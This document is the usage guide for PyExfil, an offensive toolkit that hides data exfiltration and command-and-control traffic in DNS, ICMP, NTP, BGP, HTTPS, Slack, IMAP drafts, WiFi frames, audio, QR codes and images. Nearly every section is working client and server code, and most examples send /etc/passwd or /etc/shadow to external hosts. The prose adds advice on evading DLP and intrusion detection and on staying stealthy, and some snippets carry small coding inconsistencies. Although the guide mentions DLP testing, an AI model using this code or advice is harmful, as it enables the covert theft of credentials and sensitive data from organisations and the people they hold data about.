## Overture

Generally speaking it's a good idea to open your code with some basic declaration:
```python
#!/usr/bin/env python

import os
import sys
import thread

```

## Modules Load

Since version 1.0 we have tried to set a conversion for calling the various modules. Since they behave differently and because we are lazy to backport all initial modules to that convetion some will match it while some are called differently. Here is the list of all those modules and how to call them.

### General Convention

**MIGHT NOT APPLY TO ALL !!!**

```
from pyexfil.purpose.module import Send
```

### Test Data Generation
Although this tool was initially created as a game and later on turned to be a Red Team oriented tool, at the end of a day a major usage of `PyExfil` is to test various DLP (Data Leakage Protection) systems as well as detection of intrusion. To make this missions simpler we have created a little module to generate fake data with a structure that matches both PII and PCI data sets. These are intended to trigger alerts while being broadcated outside of the network.

Here is how to use it:
```python
from pyexfil.includes import CreateTestData

c = CreateTestData(rows=1000, output_location="/tmp/list.csv")
c.Run()
```

After this you can use which ever `PyExfil` module you would like to try and exfiltrate the data set created. This way you can test your detection without risking exfiltrating valuable data.

### Network [mainly exfiltration]
#### DNS Query

This will allow establish of a listener on a DNS server to grab incoming DNS queries. It will then harvest them for files exfiltrated by the client. It **does not** yet allow simultaneous connections and transfers. DNS packets will look good to most listeners and *Wireshark* and *tcpdump* (which are the ones that have been tested) will show normal packet and not a 'malformed packet' or anything like that.

The information itself will be appended at the end.

```python
from pyexfil.network.DNS.dns_exfil import dns_exfil, dns_server

# For Client (exfil)
dns_exfil(  host="morirt.com",
            path_to_file="/etc/passwd"
            # port[53], max_packet_size=[128], time_delay=[0.01]
            )

# For Server (collecting)
# play_dead is a Boolean that will determine if the server pretends to respond to the queries or just collect them. Default is True.
dns_server(   host="demo.morirt.com"
              #port=53, play_dead=True
              )
```

#### HTTP Cookies
Exfiltration of files over HTTP protocol but over the Cookies field. The strong advantage of this is that the cookies field are supposed to be random noise to any listener in the middle and therefore is very difficult to filter. In theory, cookies done right should be a random blob of data.

The advantage of this method is that if the C&C/Exfil node are supposed to be in communication then the data itself should not be flagged.

```python
from pyexfil.network.HTTP_Cookies.http_exfiltration import send_file, listen

# For Client (exfil)
send_file(addr='http://www.morirt.com', file_path=FILE_TO_EXFIL)

# For Server (collecting)
listen(local_addr='127.0.0.1', local_port=80)
```

#### ICMP Echo 8
Uses ICMP 8 packets (echo request) to add a file payload to it. It re-implemented ICMP ping requests and some sniffers are known to capture it as malformed packets. Wireshark currently displays it as a normal packet.

```python
from pyexfil.network.ICMP.icmp_exfiltration import send_file, init_listener

# For Client (exfil)
ip_addr = "127.0.0.1"
send_file(ip_addr, src_ip_addr="127.0.0.1", file_path="", max_packetsize=512, SLEEP=0.1)

# For Server (collecting)
init_listener(ip_addr, saving_location="/tmp/")
```

#### NTP Request
Unlike NTP body, which uses the time stamps to establish communication, this module uses the NTP payload itself as the transmission container for the information. It will be setup on top of the NTP requests.

```python
from pyexfil.network.NTP.ntp_exfil import exfiltrate, ntp_listen, NTP_UDP_PORT

# For Client (exfil)
ip_addr = "127.0.0.1"
exfiltrate("/etc/passwd", ip_addr, time_delay=0.1)

# For Server (collecting)
ntp_listener(ip="0.0.0.0", port=NTP_UDP_PORT)
```

#### BGP Open
This module rides a BGP packet for establishing data communication. Since BGP is used for routing is usually has a lower profile in attacks although a small examination of such packets will show abnormal behavior.

```python
from pyexfil.network.BGP.bgp_exfil import server, exfiltrator

# For Client (exfil)
ip_addr = "5.6.7.8"
exfiltrator(ip_addr, "/etc/passwd", time_delay=0.1)

# For Server (collecting)
server("1.2.3.4")
```

#### DNSQ
Use DNS Queries to exfiltrate short bursts of communication or a full file. You must control the TLD for this to work. Listener must be executed on the DNS server.

```python
#!/usr/bin/env python3

from pyexfil.network.DNSQ import Send, Broker


a = Send(file_path='/etc/passwd', name_server='main.com', key=PYEXFIL_DEFAULT_PASSWORD)
a.Exfiltrate()

b = Broker(key=PYEXFIL_DEFAULT_PASSWORD, retFunc=_testCallBack, host='', port=53)
b.Listen()
```


#### HTTPS Replace Certificate
With this method you are configuring an HTTP server to impersonate the certificate. When you exfiltrate data, it will use the original server to exchange certificates with the duplicating server (port forwarding) and then, when this is complete, transmit the data with AES encryption but wraps it up as SSL Application Data as there is no real way of telling this.

For using this method as string delivery (short messages):
```python
# For Server:
from pyexfil.network.HTTPS.https_server import HTTPSExfiltrationServer

server = HTTPSExfiltrationServer(host="127.0.0.1", key="123", port=443, max_connections=5, max_size=8192)
server.startlistening()

# For Client:
from pyexfil.network.HTTPS.https_client import HTTPSExfiltrationClient

client = HTTPSExfiltrationClient(host='127.0.0.1', key="123", port=443, max_size=8192)
client.sendData("ABC")
client.sendData("DEFG")
client.close()
```

As an exfiltration module for files:
```python
# Server:
from pyexfil.network.HTTPS.https_server import HTTPSExfiltrationServer

server = HTTPSExfiltrationServer(host="127.0.0.1", key="123", port=443, max_connections=5, max_size=8192, file_mode=True)
server.startlistening()

# Client:
from pyexfil.network.HTTPS.https_client import HTTPSExfiltrationClient

client = HTTPSExfiltrationClient(host='127.0.0.1', key="123", port=443, max_size=8192)
client.sendFile("/etc/passwd")
client.close()
```

#### QUIC
With this method, we exfiltrate files over UDP 443 as to look like QUIC. Currently, it is written as first PoC and less as a functional tool. For example, will only work with one file at a time and not concurrent. Validity only checks MD5 and not individual packets (server does not request missing chunks from client, which it should). Nevertheless, this seems to work fine in several checks we've done and seems viable exfiltration for single file.

In the future, we should add the things mentioned above. Currently, this does not seem like there is a profiling that can be done on these streams as they appear to be identified by all interceptors as QUIC and unresolvable to the content (while QUIC uses true SSL, this uses AES which still gives a binary blob which is meaningless).

Server:
```python
from pyexfil.network.QUIC.quic_server import HTTPSExfiltrationServer

server = HTTPSExfiltrationServer(host="127.0.0.1", key="123")
server.startlistening()
```

Client:
```python
from pyexfil.network.QUIC.quic_client import QUICClient

client = QUICClient(host='127.0.0.1', key="123", port=443)      # Setup a server

# This part is just for debugging and printing, no read use
a = struct.unpack('<LL', client.sequence)                       # Get CID used
a = (a[1] << 32) + a[0]
sys.stdout.write("[.]\tExfiltrating with CID: %s.\n" % a)

client.sendFile("/etc/passwd")                                  # Exfil File
client.close()
```

#### Slack
Slack exfiltration uses the Slack API to move files around. Please notice you will need to tweak the code to make it stealthy. Right now it is defaultly designed to be noisy and appear on the user's log to make sure you're using this in a 'good' manner.

Since a lot of organizations use Slack today and in our personal anecdote most of them don't monitor, restrict or validate the utilization of it, we've decided to find creative way to do that. Especially since Slack is allowed on firewalls for organizations that work with it, it uses SSL and is rarely monitored it is a very interesting prospect for involuntary backups...

Server:
```python
from pyexfil.network.Slack.slack_server import SlackExfiltrator

slackExf = SlackExfiltrator(slackSlaveID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
slackExf._connect2Slack()
slackExf.Listen()
```

Client:
```python
from pyexfil.network.Slack.slack_server import SlackExfiltrator

slackExf = SlackExfiltrator(slackID="11111FD", slackToken="xoxo-abc", encKey="Abc!23")
slackExf._connect2Slack()
slackExf.ExfiltrateFile(file_path="/etc/passwd")
```

#### POP3 Authentication
This module will attempt to authenticate over POP3 to a remote server. The password itself will be the data that is exfiltrated. We will welcome wrappers to this module. It's pretty bad...

Server:
```python
from pyexfil.network.POP3.pop_exfil_server import _open_socket

sockObj = _open_socket()
    while True:
        try:
            conn, address = sockObj.accept()
            sys.stdout.write("[+] Received a connection from %s:%s.\n" % (address[0], address[1]))
            start_new_thread(clientthread ,(conn,))
        except KeyboardInterrupt:
            sys.stdout.write("\nGot KeyboardInterrupt, exiting now.\n")
            sys.exit(ERR)
```

Client:
```python
from pyexfil.network.POP3.pop_exfil_client import get_file, connect_to_server

b64_file, file_crc = get_file(FLOC)
    sock = connect_to_server()
    data = sock.recv(MAX_SIZE)
    if data.find("+OK POP3 service") == -1:
        sys.stderr.write("[-] Server header did not match.\nHalting exfiltration.\n")
        sys.exit(ERR)
    sock.send("USER exfil\n")
    data = sock.recv(MAX_SIZE)
    if data.find("+OK password required for user exfil") == -1:
        sys.stderr.write("[-] Server did not accept the user. Something is wrong.\n")
        sys.exit(ERR)
    all_data_packets = [b64_file[i:i+CHUNK] for i in range(0, len(b64_file), CHUNK)]
    sock.send(base64.b64encode("%s;%s;%s;0" % (FLOC, file_crc, len(all_data_packets)))) # filename, crc32, packets_count, this_packet_count
    sys.stdout.write("[+] Server passed auth and has received the header.\n")
    data = sock.recv(MAX_SIZE)
    if data.find("-ERR [AUTH] Authentication failed") == -1:
        sys.stderr.write("[-] Did not get confirmations for file content.\n")
        sys.exit(ERR)

    progress = progressbar.ProgressBar()
    for i in progress(range(len(all_data_packets))):
        sock.send("%s;%s" % (i, all_data_packets[i]))
        time.sleep(0.1)
        data = sock.recv(MAX_SIZE)
        if data.find("-ERR [AUTH] Authentication failed") == -1:
            sys.stderr.write("[!] Error seding packet %s.\n" % i)
            break

    sock.send("0000")
    sock.close()
    sys.stdout.write("[+] Finished sending file. Closing socket.\n")
```

#### FTP MKDIR
FTP MKDIR is a technique based on using an FTP server and assuming that the corporate is using an active MiTM to disable file upload. With this in mind, the file is then compressed using `zlib` and base64 encoded (to be ASCII representable) and then split into chunks. Each chunk is then made the name of a directory using MKDIR command (which is not a file upload and should be enabled).
It can be used in the following manner:

```python
from pyexfil.network.FTP.ftp_exfil import FTPExfiltrator
# Port is by default 21, but can be changed with 'port=2121'
# Credentials are () but can be added with: creds=('user','pass')
# TLS is disabled by default but could be added with tls=True
FTPexf = FTPExfiltrator(server="10.211.55.15", file2exfil="/bin/bash")
FTPexf.get_file_chunks()
FTPexf.build_final_chunks()
FTPexf.send_chunks()
```

```python
from pyexfil.network.FTP.ftp_exfil import GetContent
# Directory argument can be added with: dir="/home/user/directory"
FTPHand = GetContent()
FTPHand.get_file()
```

#### Source IP Based Exfiltration

Will take a file and attempt to exfiltrate it on the source IP field in a TCP/IP packet. This method is slow, and depending on the configuration of the IDSs might trigger more alerts or none at all. We figured out it worked in a lot of our cases although it was relatively slow. It is written poorly and will not even support exfiltration of two files at the same time and will not make up for integrity issues. We welcome contributors here.

Exfiltration
```python
from pyexfil.network.SpoofIP import spoofIPs_client

_send(file_path="/etc/passwd", to="127.0.0.1")
```

Decoding (must run simultaneously)
```python
from pyexfil.network.SpoofIP import spoofIPs_server

sniff(iface="en0", prn=pkt_callback, filter="tcp", store=0)
```

#### HTTP Response

This one uses a custom crafter HTTP Response instead of a request. This might be
very useful in various cases. Many times HTTP requests are monitored for ratio,
type, data, etc and Responses are kind of ignored. **Could be extremely useful
in cases when you have passive MiTM!**

```python
from pyexfil.network.HTTPResp.client import Broadcast
b = Broadcast(
                fname="/etc/passwd",
                dst_ip="www.espn.com",
                dst_port=80,
                max_size=1024,
                key=DEFAULT_KEY
                )
b.Exfiltrate()

# Assembly of data
a = Assemble()
for i in b.packets:
	if a._append(i):
		continue
	else:
		print(i)
print(a.Build())
```

#### IMAP Draft
This particular module is extremely useful when the organization is using IMAP mailboxes with email filtering. The general concept is that email filtering is applied on outgoing (and sometimes) incoming emails. However, these filters are generally no applied to Draft folders since these are not yet in transit.

In a case where you have obtained a foothold on such a machine, by extracting the credentials you can access the mailbox associated with the account from outside the organization's corporate network.

```python
from pyexfil.network.Draft import Send, Broker

a = Send(file_path='/etc/passwd', server_addr='mail.MoriRT.com', server_creds=('MAILBOX@HOST.com','PASSWORD!'), key='DEFAULT')
check = a.Exfiltrate()
print(check) # Boolean
```

### Communication

#### NTP Request
This method builds an NTP packet, assuming these are not as heavily monitored, and using the 8*4 bytes allocated for timestamping as the communication channel. This limits the communication to 32 bytes per packet in order to keep the structure of the NTP packet whole.

```python
# For client
from pyexfil.Comm.NTP_Body.client import Broadcast

Broadcast(data="Hello World", to='127.0.0.1', port=123, key="sekret")
# Notice that `to`, `port` and `key` are optional.

# For Server
from pyexfil.Comm.NTP_Body.server import Broker

b = Broker()
b.listen_clients()
# Customize the code to handle various commands.
```

#### DropBox LSP
Dropbox uses UDP broadcast packets to identify other Dropbox instances on the LAN and sync files between them. This exfiltration method can work in one out of two scenarios:
  * Unicast exfiltration - sending the data over DB-LSP packets to your server.
  * LAN Broadcast communication - assuming you're on the same LAN you can configure a listener and a sender to communicate over broadcast, masking the sender and receiver and in a way that might surpass some alerting mechnisms as there is "no direct connection" between them.

Shell Mode
```bash
$ sudo python dblsp.py

    To communicate between two hosts over broadcast you will need:
    	1) Setup an ecnryption key whichi will be identical on both hosts.
    		set key 123456
    	2) Know which host is going to broadcast the message:
    		set listener 10.0.0.1
    	3) Start active mode:
    		active 10.0.0.255

    Now just send messages with:
    	send "hello world"


DB_LSP > set key 123456
 key --> 123456.
DB_LSP > set listener 10.0.0.2
 listener --> 10.0.0.2.
DB_LSP > active 10.0.0.255
Starting active mode with 10.0.0.255.
Starting listener for 10.0.0.2.
10.0.0.255@DB_LSP > send hello
184 bytes sent to ('10.0.0.255', 17500).
10.0.0.255@DB_LSP >
```

Please notice that the `listener` is the IP from which you're expecting to get the message. This is so that when you get a broadcast you know which one to decode and understand. `active` will point to which IP address to send the UDP packets. Use a `.255` address for broadcast or a specific IP for unicast.

Constant Sniff and Decode :
```python
SniffAndDecode(key="123456", host="OtherIP", port=17500)
```

Broadcast a message:
```python
obj = DB_LSP(key="123456", data="Hello World", host="192.168.0.255", port=17500)
obj.Send()
```

#### DNS Over TLS

DNS over TLS is as it sounds. As more and more services start supporting DNS over TLS and it seems like many organizations keep that door open as it this protocol provides superior protection over plain-text DNS we thought this might be an interesting opportunity.

```python
# For Client:
from pyexfil.Comm.DNSoTLS.client import Send

Send(data="Hal, please open the door.", server='1.1.1.1', port=DNS_OVER_TLS_PORT, certCheck=CHECK_CERT)


# Server:
from pyexfil.Comm.DNSoTLS.server import StartServer

StartServer(server_name=LOCAL_HOST, port=DNS_OVER_TLS_PORT, clients=MAX_CLIENTS, certfile=CERT_FILE, keep_ratio=True)
```

#### ARP Broadcast
This method is using ARP to broadcast messages over the LAN so that someone listening cannot locate who is listening on this channel. Obviously ARP would not be relayed outside the LAN, however, as a mesh network inside the LAN with broadcast functionality it should be as close an possible to impossible to detect and then identify infected hosts.

```python
# Broadcast:
from PyExfil.pyexfil.Comm.ARPBroadcast.communicator import broadcast

broadcast(message="This is a late parrot!", key=PYEXFIL_DEFAULT_PASSWORD)


# Listener:
import thread
from PyExfil.pyexfil.Comm.ARPBroadcast.communicator import Broker

b = Broker(key=PYEXFIL_DEFAULT_PASSWORD, retFunc=testCallBack)
thread.start_new_thread(b.listen_clients, ())
```

#### JetDirect
This "protocol" is used extensively in some networks to send files to be printed by various printers. Since it is widely used we thought it might be interesting to run inside the network for communication. Especially if you bother changing your MAC address to a printer's. This method is extremely useful inside the LAN.

```python
import thread
from pyexfil.Comm.jetdirect.communicator import Broker

def PRINT(src, data):
    print(src)
    print(data)

b = Broker("patient0", host="127.0.0.1", port=9100, key="123", retFunc=PRINT)
thread.start_new_thread(b.listen_clients, ())
b.broadcast_message("hello world!")
```

#### GQUIC
The QUIC protocol (Quick UDP Internet Connections) is an entirely new protocol for the web developed on top of UDP instead of TCP. Google’s version of QUIC (often called gQUIC) does roll it’s own crypto but that is currently being standardized by IETF (commonly known as iQUIC for now) which basically uses TLSv1.3.

```python
from pyexfil.Comm.GQUIC import Send

Send(file_name='/etc/passwd', CNC_ip='1.1.1.1', CNC_port=443, key='IMPICKLERICK!')
```

#### MDNS Query
Multicast DNS (mDNS) protocol resolves host names to IP addresses within small networks that do not include a local name server. This behavior happens even if a DNS server is locally available since most OSs will attempt looking for on regardless of the presence of a name-server on the network. This opens an interesting avenue for another Broadcast based communication for C&C. By default, mDNS only and exclusively resolves host names ending with the .local top-level domain (TLD) and is coded as such on default. You can change it, but we advise keeping a .local address to avoid curious eyes...

```python
from pyexfil.Comm.MDNS import Send

Send('1.1.1.1', "It's time to get schwifty", sequence=42, spoof_source=False, dns_name='google.com')
Send('1.1.1.1', "You gotta get schwifty", sequence=43, spoof_source='1.2.3.4', dns_name='yahoo.com')
```

#### AllJoyn
AllJoyn is a collaborative open source software framework that allows devices to communicate with other devices around them. The system uses the client–server model to organize itself. For example, a light could be a "producer" (server) and a switch a "consumer" (client). The system also has technology for audio streaming to multiple device sinks in a synchronized way. Source code of the AllJoyn framework is located in the AllJoyn Open Source Project's repositories [AllJoyn Git](https://git.allseenalliance.org/cgit). Details for all current projects are available at [AllJoyn Wiki](http://wiki.alljoyn.org/).

This protocol is very prevalent with many smart homes/equipment providers and would be expected to have presence on the LAN. Currently we are not aware of a product/software that analyzes it for security anomalies.

```python
import uuid

from pyexfil.Comm.AllJoyn import Send, ALLJOYN_PORT

Send(
		dst_ip = "8.8.8.8",
		from_ip = "1.1.1.1",
		data = 'Now online',
		src_port=ALLJOYN_PORT,
		session_id=uuid.uuid4().hex
)
```

#### Packet Size
This one can almost only be used for communication rather than data exfiltration. The idea is to take data, convert it into bytes and then encode these bytes as length in a packet. For example, the string `EXFL` will be converted into `["EX", "FL"]` which will be `[[69, 88],[70, 76]]` which will end up being two packets:

```python
69*"0" + "\x00" + 88 * "1" + "\x00"
```

```python
70*"0" + "\x00" + 76 * "1" + "\x00"
```

Which is why, as said before, we highly recommend using this method over HTTPS (as implemented here) and using it to relay key codes (i.e., `EX` will mean `exfiltrate` in both sides).

```python
#!/usr/bin/env python3

from pyexfil.Comm.packet_size import Send

# Send with encryption & compression (WHY?!)
a = Send(dest_ip="google.com", key=None, port=443, compress=False)
check, output = a.send_string("hello") # this will also send the packets
print(a.Decode(output))

# Send without encryption or compression
a = Send(dest_ip="google.com", key="HeyDonn", port=443, compress=True)
check, output = a.send_string("hello")
print(a.Decode(output))
```

#### UDP Sport

UDP source port uses the source-port byte to send out `int`s with no body. Hopefully evading packet size detection mechanisms.

```python

# Server
from pyexfil.network.UDP_SPort import Send

key = "123456"
ip_addr = "127.0.0.1"

a = Send(key, ip_addr, dport=Send.REMOTE_UDP_PORT, wait_time=Send.DEFAULT_TIME_BETWEEN_PACKETS)
a.Sender('Hello World!')

# Client
from pyexfil.network.UDP_SPort import Broker

key = "123456"

b = Broker(key, ip_addr="0.0.0.0", local_port=Broker.REMOTE_UDP_PORT)

```

#### Certificate Exchange
This module is exploiting the SSL certificate exchange mechanism. When a new SSL connection is established, a certificate is exchanged. This module will convert data into the value of the serial number of a certificate and then use SSL connection establishement (handshake) as the means to transport the certificate. This is very useful for transmitting short messages in a covert manner. Most firewalls and proxies should enable SSL communication.

```python
# Server
from pyexfil.Comm.cert_exchange import Broker

b = Broker(key="123456", server="127.0.0.1", port=8443)
b.GetData()


# Client
from pyexfil.Comm.cert_exchange import Sender

a = Sender(key="123456", server="127.0.0.1", port=8443)
a.Send("Hello world")
```

### Physical

#### Audio
The Audio module will compile a file into a WAV function. When it's being played a listener can collect the tones and should be able (in a clean environment!) to reconstruct the file. This should be relatively useful for AirGapped networks which are extremely hardened.

```python
# Client (exfiltrator)
from pyexfil.physical.audio.exfiltrator import Exfiltrator

Exfiltrator("/etc/passwd")

# Server (listener)

""" Not Built Yet... """
```

#### QR Codes
This module is for machines that are, again, air-gapped from other networks and have severe hardening. It's meant to convert a file to a set of QR codes to be scanned by a camera on another machine and still be able to make sense of them.

It was written under MacOS so for any bugs please report to us so that we can fix them.

Installing requirements for this module: `pip install --user -r pyexfil/physical/qr/requirements.txt`.

For MacOS you might need `opencv` so:
```bash
brew tap homebrew/science
brew install opencv
```

Creating the QR Codes:
```python
from pyexfil.physical.qr.generator import CreateQRs, PlayQRs

CreateQRs('/etc/passwd', folder="/tmp/qr_gen0")
PlayQRs("/tmp/qr_gen0") # if you want the QRs to be displayed on the screen one by one.
```

Decoding the QR Codes
```python
from pyexfil.physical.qr.decoder import startFlow, DIR_MODE, CAM_MODE

if __name__ == "__main__":
    startFlow(mode=DIR_MODE) # will use data in 'output' directory.
    startFlow(mode=CAM_MODE) # will use data from camera
```

#### WiFi Frame Payload
This technique is especially efficient when you have some physical proximity to the machine that will exfiltrate the data and for large data sets. The idea behind this is to create Dot11 frames without any network association and sending them out. Any DLP device should not detect this as there is no 'real' network connectivity. There is no handshake, association or any other indication that the machine is communicating over WiFi other than the NIC sending frames.

This method can exfiltrate large data sets due to these conditions but required physical proximity to intercept the packets. Please bear in mind that we have built no quality compensation mechanism. Therefore, a single dropped packet and the data is lost. As always, we endorse anyone to add QA features to this technique and make it more operationally sound.

```python
# Client (exfiltrator)
from pyexfil.physical.wifiPayload import client

client.exfiltrate(file_path="/etc/passwd", key="shut_the_fuck_up_donnie!")

# Server (listener)
from pyexfil.physical.wifiPayload import server

server.StartListening(adapter="en0")
```

### Steganography

#### Image Binary Offset
The binary offset technique will take a file, (zlib it), convert it into a binary string *b01010101...*, and then take an image, and convert it into a pixel array with 3 entities per pixel `(int(R),int(G),int(B))`. In case where the image has a transperancy pixel (PNG for example) the PyExfil will currently ignore it. Then the binary string will be incorprated into the pixel array and saved in another location.

The result, is an image file that contains all the data. Without the original image file you cannot decode the image as there is nothing to compare the changes to.

As an executable module:
```bash
binoffset.py baseimage "originalImage.jpg" "outputpath.jpg"
binoffset.py encode "baseImage.jpg" "/etc/passwd" "newImage.jpg"
binoffset.py decode "newImage.jpg" "baseImage.jpg" "passwdFile"
```

So in total, the stages are:

1. Convert an image to a reliable base image for the use by this technique.
2. Take the file `/etc/passwd` and use the base image `baseImage.jpg` to create a new image named `newImage.jpg` with all the data from `/etc/passwd` encorporated into it.
3. Take the image containing the data along with the base image and give me a file named `passwdFile` with all the content of `/etc/passwd` in it.

As a python module:

```python
from pyexfil.Stega.binoffset.binoffset import PrepareBaseImage, DecodeExfiltrationFile, CreateExfiltrationFile

originalImage = 'myLogo.png'      # Image downloaded from the internet
fileToExfiltrate = '/etc/passwd'  # The file you want to embed in the picture

# Prepare image for use
PrepareBaseImage(imagePath=originalImage, outputPath="base_"+originalImage)

# On the machine with the file
CreateExfiltrationFile(originalImage="base_"+originalImage, rawData=fileToExfiltrate, OutputImage="niceImage.png")

# After getting the image back, use this to decode it
DecodeExfiltrationFile(originalImage="base_"+originalImage, newImage="niceImage.png", outputPath="passwd.file")
```

#### Video Dictionary

This module will take as an input a file to exfiltrate and a video file. The next thing it will do is convert the file to exfiltrate into a series of `chr(byte)`. After that, it will attempt to get several frames from the video file and match each corresponding `pixels[i](r,g,b)` into each of the 0-255 possible bytes. It will then create a compressed and plain text dictionary for the original file in those images creating an output of a dictionary file with will hold a CSV with `frameindex, pixel (offset), colour_value(r/g/b)`. This dictionary is absolutely useless without the original identical video (no recompression or alterations at all).

We think this technique can be particularly useful in scenarios where there are very powerful data inspections on the traffic and that the original data is very easy to detect (CC information or emails for example). Let's take the instance where the data you would like to exfiltrate for the purpose of your red-team / pentest purpose is plain text credit cards and that traffic is thoroughly inspected while blocking any type of binary/encrypted data form. Basically a very restrictive white-list based traffic rules for example.

Since the output of this module will be a CSV dictionary which will contain none of the original data in anyway, one can ZIP it (we used zlib) and get a fairly decent compression rate, while if anyone would like to examine the CSV file (which will be easily recoverable) one could always add any headers they would like and get a reasonable CSV that is easy to maintain feasibility of its use.

To make stuff easier, we've added a functionality to download a video from YouTube with a specific quality and frame to make sure one could use it without actually transferring the video file from one end to the other.

```python
from pyexfil.Stega.video_dict.vid_to_dict import TranscriptData, DecodeDictionary

TranscriptData(video_file="video.mp4", input_file="/etc/passwd", output_index="output.map")
DecodeDictionary(originalVideo="video.mp4", dictionaryFile='output.map', outputFile="original_passwd")
```

#### Braille Text Document
This module can be very useful when you have only a printer at hand. It will try to avoid detection based on content by compressing the data, converting it to hex and then representing that in Braille to it is relatively easy to scan, use OCR and then convert back to the actual data.

```python
#!/usr/bin/env python3

from pyexfil.Stega import braille
braille.Send(file_path='/etc/passwd', to_file=True, to_screen=False)
```

This will generate one `output.txt` file with the Braille text and one `output.pdf` file with the text aligned and ready to be printed.

To decode simply use:
```python
#!/usr/bin/env python3

from pyexfil.Stega import braille
data = open("output.txt", 'r').read()
braille.Decode(data)
```

#### PNG Transparency
This little nifty module will take a PNG image file and embed the data you want to exfiltrate as the transparency bit (4th). It does mean that the image file needs to be big enough for large sets of data but for rapid-short-burst communication it can be very useful.

```python
#!/usr/bin/env python3

from pyexfil.Stega.png_transparency import Encode, Decode

encodingWrapper = Encode(key="ABC123456", data="Secret Secret Data")
encodingWrapper.Run()

decodingWrapper = Decode(key="ABC123456", file_path='output.png')
print(decodingWrapper.Run())
```

#### ZIP Loop
This module is not specifically for steganography but was put here as it is the best fit. The idea is that many DLP scanners will not pass beyond the 1k iterations of decompressing ZIP files to avoid overhead. This uses a big random number of iterations resulting in a significantly larger output that should go unnoticed by some DLP mechanisms.

```python3

from pyexfil.Stega.zipception import Broker, Sender

a = Sender(folder_path="/etc/shadow", key=Sender.PYEXFIL_DEFAULT_PASSWORD, Sender.iterations=NUMBER_OF_ITERATIONS)
a.Run()

b = Broker("False.zip", key=Broker.PYEXFIL_DEFAULT_PASSWORD)
b.Run()

```
